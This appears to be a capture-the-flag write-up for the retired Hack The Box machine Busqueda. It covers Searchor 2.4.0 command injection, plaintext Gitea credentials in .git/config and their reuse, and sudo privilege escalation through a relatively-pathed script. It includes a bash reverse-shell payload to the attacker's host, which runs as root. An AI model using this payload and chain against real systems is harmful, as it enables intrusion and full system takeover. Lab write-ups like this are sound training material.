## Busqueda

### Info:
- Name: **Busqueda**
- OS: **Linux**
- Type: **Unauthenticated**
- Difficulty: **Easy**
- Status: **Retired**

### Content:
- [**`testing.md`**](https://github.com/cac3r/htb_machines/blob/main/busqueda/testing.md)                - Raw notes / working log
- [**`report.pdf`**](https://github.com/cac3r/htb_machines/blob/main/busqueda/report.pdf)                - Professional report
- [**`attack_chain.png`**](https://github.com/cac3r/htb_machines/blob/main/busqueda/attack_chain.png)   - Attack chain diagram
- `screenshots/`           - Supporting screenshots

---
### Brief:
##### Foothold: `Searchor 2.4.0` exploit to run arbitrary system commands
Starting the test on target system `busqueda` unauhenticated. After network/host enumeration, navigating the exposed web application on port 80, discover `Searchor 2.4.0` technology. Searching for known exploits for this version surfaces a public PoC abusing a injection of system commands on the search query parameter `engine`. Using https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/blob/main/exploit.sh to automate the exploitation, an attacker can easily specify their local IP and port to run this exploit, achieving to execute python reverse shell code on the taget system, (with a running listener) obtaining a shell as the service account running the web service: `svc`.

##### Sensitive data exposure (plaintext credentials in `.git/config`) + Credential reuse
Navigating the file system as `svc`, list the contents of configuration files on the apache server directory. `/etc/apache2/sites-enabled/000-default.conf` leaks the existance of a Gitea service running locally on port 3000, with Vhost subdomain: `gitea.searcher.htb`. On the other hand, listing contents of `.git` directory configuration `/var/www/app/.git/config`  discover a credential set for `cody`, enabling to connect to Gitea with the credential. Furthermore, the password is discovered to be reused for `svc` account.

##### Privilege Escalation: Abusing Relative-path execution flaw on script executable as root
Having now the credential for `svc`, enumerating sudo privileges with `sudo -l`, discover python3 execution of `system-checkup.py` (`/usr/bin/python3 /opt/scripts/system-checkup.py`). The script presents 3 functionalities that are used to abuse the permission to run it. First  `docker-ps` argument is used to list running docker containers, identifying Gitea container ID (`960873171e2e`). Knowing this ID, using the next argument `docker-inspect` to dump the containers config, discovering `GITEA__database__PASSWD` field leaking a password for database, reused for administrator login at `gitea.searcher.htb`. Now logged in as administrator to Gitea can read the source code for all the scripts present,  `system-checkup.py` being one of them. Reading the script, it stands out that the function/action `full-checkup` calls a script `./full-checkup.sh` missing a full path scpecification from root `/`. This is abused by creating a "clone" file inside a writable directory `/dev/shm` with identical naming `full-checkup.sh`, editing to include a bash reverse shell payload reaching to the attacker specified remote system IP and port. Now, with this "clone" script present, the permission to run `system-checkup.py` is used to execute it for `full-checkup` action, calling current working directory "clone" file, executing the reverse shell code as `root`, granting the attacker a shell as `root`. At this point having administrator privileges inside the target system `busqueda`.

---
### Techniques:
- Searchor-2.4.0 exploit. RCE injecting code on `engine` parameter
- Upgrade shell with python pty
- Listing internal ports
- Reading Apache web server configuration files
- Reading .git configuration file
- Listing execution permissions as root with low-priv user (sudo privileges)
- Abusing relative-path execution flaw in script executable as root. Create "clone" script edited for reverse shell in a writable directory. Call cloned script in current directory with privileged script + target argument

----
----
### Lesson:

Lesson #1: Read errors carefully, the last step to root didnt work because a simple typo. (Wrote `bach` instead of `bash` in the reverse shell code, and the output error showed that with `bach: command not found`, but didnt pay close attention).

---
##### Upgrade shell with python pty

Upgrading dumb shell

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

CTRL + Z

```
stty raw -echo; fg
```

ENTER, or run `reset`

Separately, on local host, see current rows and cols

```
stty size
```

Apply it on target shell

```
stty rows <> cols <>
```

```
export TERM=xterm
```

----
##### Reading Apache web server configuration files

Debian-based splits Apache's config across several directories under `/etc/apache2/` instead of one giant file:

```
/etc/apache2/
├── apache2.conf          ← main config, ties everything together
├── ports.conf            ← which ports/IPs Apache listens on (80, 443…)
├── sites-available/      ← ALL defined virtual hosts (available, not necessarily on)
├── sites-enabled/        ← symlinks to the ones actually ACTIVE
├── mods-available/       ← all installed modules
├── mods-enabled/         ← symlinks to active modules
├── conf-available/       ← extra config snippets
└── conf-enabled/         ← symlinks to active snippets
```

The **available vs enabled** pattern is the key idea. Anything in `sites-available` is _defined_; only what's symlinked into `sites-enabled` is _live_. Debian toggles these with `a2ensite`/`a2dissite` (which just create/remove the symlinks). 
So `sites-enabled` shows you what's genuinely serving right now.

`000-default.conf` is the default virtual host inside `/etc/apache2/sites-enabled/`

---
##### Reading .git configuration file

Every Git repository has a hidden `.git/` directory that stores all the repo's metadata — history, branches, and the `config`. The `[remote "origin"]` section records **where this repo was cloned from and pushes to**.

Normally, on Debian/Ubuntu web. Filesystem Hierarchy Standard is:

```
/var/www/
```

Other commons: `/srv`, `/opt`, `/home/*/`, `/usr/share/`

```
ls -la
```

Find .git

```
cat .git/config
```

***There may be hard coded credentials***, stored in plaintext because whoever set this up cloned the repo using **HTTP basic auth in the URL**. Git happily saves the full URL — password and all — into `.git/config`. This is a real-world mistake people make constantly, and it's why credentials-in-git-config is a well-known thing to check.

***Why this happens***

When you clone over HTTP and include credentials in the URL to avoid typing them each time, Git persists that exact string. Anyone who can later read the file, reads the password in cleartext. The lesson (both offensive and defensive): **never put credentials in a remote URL**; use SSH keys or a credential helper instead. Offensively, `.git/config`, `.git-credentials`, and shell history are all standard hunting grounds for exactly this.

---
##### Listing execution permissions as root with low-priv user

```
sudo -l
```

May need `-S` flag to read password from stdin if using a dumb shell

```
echo '<password>' | sudo -S -l
```


Example:

```
User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

- **`(root)`** — you may run this command _as root_. This is what makes it a privesc vector: whatever this executes runs with root's privileges.
- **`/usr/bin/python3 /opt/scripts/system-checkup.py`** — the specific command allowed: Python running a particular script.
- **`*`** — a wildcard, meaning you can pass **any arguments** after the script name.

If there is a `*` wilcard, may need to add anything after for it to function, and print the available arguments and/or syntax.

---
##### Abusing relative-path execution flaw in script executable as root

A script may include calls for other scripts in system. If a script is not specified with full path, and can execute it as root, an attacker can write a reverse shell script with that name, call the script from current dir containing created script to execute the code as root.

Example:

```
elif action == 'full-checkup':
    try:
        arg_list = ['./full-checkup.sh']  <-------
        print(run_command(arg_list))
        print('[+] Done!')
```

23

The script is calling another script without full path from root. So, can create a `full-checkup.sh` that includes malicious code for a reverse shell. In this example, the script containing this flaw is a function called from an argument on a `system-checkup.py` that can be executed as root from a low-priv user. This can be used to elevate privileges, getting a shell as root (who executes it).

The malicious clone for `full-checkup.sh` 

```
#!/bin/bash

bash -c 'bash -i &> /dev/tcp/<LOCAL_IP>/9001 0>&1' 
```

Running `system-checkup.py` specifying `full-checkup` option. From current writable working directory (`/tmp` ,`/dev/shm`, ...) including the malicious script created.

```
chmod +x full-checkup.sh
```

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

After execution, may achieve a reverse shell execution as root, obtaining a shell on the running listener.
